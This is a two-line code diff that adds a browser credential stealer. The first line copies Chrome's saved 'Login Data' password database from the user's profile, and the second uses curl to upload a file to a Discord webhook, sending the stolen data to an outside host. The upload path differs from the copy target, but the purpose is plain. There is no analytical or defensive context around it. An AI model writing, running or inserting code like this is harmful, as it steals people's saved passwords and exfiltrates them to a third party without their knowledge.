@@ -1,0 +1,2 @@
+COPY "%localappdata%\Google\Chrome\User Data\Default\Login Data" "grabbed/data.txt"
+curl -i -H "Accept: multipart/form-data" -H "Content-Type: multipart/form-data" -X POST -F "file2=@bella_raga/data.txt" https://discord.com/api/webhooks/859414852219699241/PyirDJY5ett9Orx95DHTKyHB-DtoKvWXUtmqV-UrfJIYFwPmQXtG1wezoPrHdEp4VS0e
